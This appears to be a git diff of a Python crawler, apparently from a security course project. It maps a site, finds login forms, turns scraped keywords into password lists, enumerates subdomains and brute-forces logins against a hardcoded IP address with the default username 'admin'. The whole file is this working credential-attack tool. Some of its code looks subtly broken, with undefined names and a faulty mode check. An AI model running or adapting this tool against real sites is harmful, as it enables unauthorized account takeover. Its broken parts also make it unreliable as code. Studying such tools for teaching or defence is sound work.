@@ -1,18 +1,24 @@
 from html_parser import HTMLParser
+from password_generator import generate_password_list
 from requests import get_request, get_status, post_request
 from url_utils import extract_url_parts, reformat_url
+
+import argparse
 import collections
-import password_generator
 import socket
 
-password_list = []
-MAX_DEPTH = 10
 SUBDOMAINS_FILE_PATH = './subdomains-100.txt'
 
 class Node:
     def __init__(self, url, depth):
         self.url = url
         self.depth = depth
+
+class Counter:
+    def __init__(self, count, max_depth, page_max):
+        self.count = count
+        self.max_depth = max_depth
+        self.page_max = page_max
 
 def add_duplicate_url(url, seen):
     # If the URL has a trailing slash, add the URL without the slash to set of seen nodes
@@ -23,9 +29,9 @@ def add_duplicate_url(url, seen):
     else:
         seen.add(url + '/')       
 
-def process_node(start_url, node, header_dict, forms, keywords, seen, add_next):
+def process_node(start_url, node, header_dict, forms, keywords, seen, add_next, counter):
     print('Depth ' + str(node.depth) + ': Processing: ' + node.url)
-
+    
     # Make GET request to the current URL      
     html_doc = get_request(node.url, header_dict)
     if html_doc is not None:
@@ -38,9 +44,13 @@ def process_node(start_url, node, header_dict, forms, keywords, seen, add_next):
         form_found = parser.detect_login_form()
         if form_found:
             forms.add(node.url)
-        
+
+        counter.count += 1
+        if counter.count >= counter.page_max:
+            return
+
         # Add reachable URLs from current node if its depth < max depth
-        if node.depth < MAX_DEPTH:
+        if node.depth < counter.max_depth:
             # Retrieve set of URLs reachable from current node 
             linked_urls = parser.extract_urls()
 
@@ -55,7 +65,7 @@ def process_node(start_url, node, header_dict, forms, keywords, seen, add_next):
                     # Traversal dependent function to add next node
                     add_next(url) 
 
-def crawl_bfs(start_url, header_dict):
+def crawl_bfs(start_url, header_dict, counter):
     print('Starting Breadth-First Crawling')
     print('-' * 50)
     forms = set()
@@ -73,11 +83,14 @@ def crawl_bfs(start_url, header_dict):
     while queue:
         node = queue.popleft()
         add_to_queue = lambda url: queue.append(Node(url, node.depth + 1))  
-        process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue)
+        process_node(start_url, node, header_dict, forms, keywords, seen, add_to_queue, counter)
+
+        if counter.count >= counter.page_max:
+            return keywords, forms, seen
         
     return keywords, forms, seen
 
-def crawl_dfs(start_url, header_dict):
+def crawl_dfs(start_url, header_dict, counter):
     """ Wrapper function to initialize first call to recursive DFS crawl function """
     
     print('Starting Depth-First Crawling')
@@ -91,12 +104,14 @@ def crawl_dfs(start_url, header_dict):
     seen.add(start_node.url)
     add_duplicate_url(start_node.url, seen)
     
-    _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen)
+    _crawl_dfs(start_url, start_node, header_dict, forms, keywords, seen, counter)
     return keywords, forms, seen
 
-def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen):
-    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen)
-    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack) 
+def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen, counter):
+    if counter.count >= counter.page_max:
+        return
+    add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen, counter)
+    process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack, counter) 
 
 def read_subdomains():
     with open(SUBDOMAINS_FILE_PATH, "r") as f:
@@ -129,7 +144,12 @@ def crawl_subdomains(bfs, url, header_dict):
         finally:
             conn.close()    
             
-def brute_force(user, passwords, forms, user_agent):
+def brute_force(user, keywords, forms, user_agent):
+    passwords = set()
+    for word in keywords:
+        print(word, '  :  ', generate_password_list(word))
+        passwords.update(generate_password_list(word))
+
     for form in forms:
         print('\nAttempting to brute-force: ' + form + '\n')
         get_header = {'User-Agent': user_agent}
@@ -156,15 +176,62 @@ def brute_force(user, passwords, forms, user_agent):
                 break
             else:
                 print('Login Failed...\n')
+        
+        print('Ran out of passwords! Bruteforce failed!')
           
-def web_crawler():
-    url = reformat_url('3.16.219.26')
+def main(username, maxdepth, maxpage, mode):
+    
+    url = 'http://3.16.219.26/'
+    url = reformat_url(url)
+    page_counter = Counter(0, maxdepth, maxpage)
 
-    keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {})
 
-    brute_force('user', keywords_bfs, forms_bfs, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246')
+    if mode == 'bfs':
+        """
+        BFS
+        """
+        keywords, forms, seen = crawl_bfs(url, {}, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        brute_force(username, keywords, forms, '')
+    elif mode == 'dfs':
+        """
+        DFS
+        """
+        keywords, forms, seen = crawl_dfs(url, {}, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        brute_force(username, keywords, forms, '')
+    else:
+        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
+        return
+
+    print('\n\n\n', get_subdomains(url))
 
 
 if __name__ == '__main__':
-    web_crawler()
+    parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
+    parser.add_argument('--u', nargs = 1, type = str, help = 'USERNAME')
+    parser.add_argument('--maxdepth', nargs = 1, type = int, help = 'MAX DEPTH TO CRAWL')
+    parser.add_argument('--maxpages', nargs = 1, type = int, help = 'MAX PAGES TO CRAWL')
+    parser.add_argument('--mode', nargs = 1, type = str, help='MODE OF CRAWLING : \'bfs\' OR \'dfs\'')
+    args = parser.parse_args()
+    username, mode = '',''
+    maxdepth, maxpage = 0,0
+    if (args.u ==None):
+        username = 'admin'
+    else :
+        username = args.u.pop()
+    if (args.maxdepth == None):
+        maxdepth = 10
+    else :
+        maxdepth = args.maxdepth.pop()
+    if (args.maxpages == None):
+        maxpage = 10
+    else :
+        maxpage = args.maxpages.pop()
+    if (not(args.mode == 'bfs' or args.mode == 'dfs')):
+        mode = 'bfs'
+    else :
+        mode = args.mode.pop()
+    main(username, maxdepth, maxpage, mode)
+
     
